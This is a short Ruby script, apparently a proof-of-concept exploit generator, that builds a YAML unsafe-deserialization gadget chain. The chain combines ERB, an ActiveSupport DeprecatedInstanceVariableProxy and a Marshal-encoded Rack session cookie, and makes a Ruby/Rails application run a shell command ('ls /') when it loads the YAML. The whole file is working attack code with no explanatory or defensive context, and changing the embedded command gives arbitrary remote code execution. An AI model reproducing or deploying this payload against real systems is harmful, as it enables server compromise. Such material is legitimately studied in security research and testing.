require 'yaml'
require 'base64'
require 'erb'

class ActiveSupport
  class Deprecation
    def initialize()
      @silenced = true
    end
    class DeprecatedInstanceVariableProxy
      def initialize(instance, method)
        @instance = instance
        @method = method
        @deprecator = ActiveSupport::Deprecation.new
      end
    end
  end
end

code = <<-EOS
puts `ls /`
EOS

erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@lineno, 1337

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result

payload = Base64.encode64(Marshal.dump(depr)).gsub("\n", "")

payload = <<-PAYLOAD
---
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Rack::Session::Abstract::SessionHash
    req: !ruby/object:Rack::Request
      env:
        "rack.session": !ruby/object:Rack::Session::Abstract::SessionHash
          id: 'hi from espr'
        HTTP_COOKIE: "a=#{payload}"
    store: !ruby/object:Rack::Session::Cookie
      coder: !ruby/object:Rack::Session::Cookie::Base64::Marshal {}
      key: a
      secrets: []
    exists: true
    loaded: false
PAYLOAD

puts payload
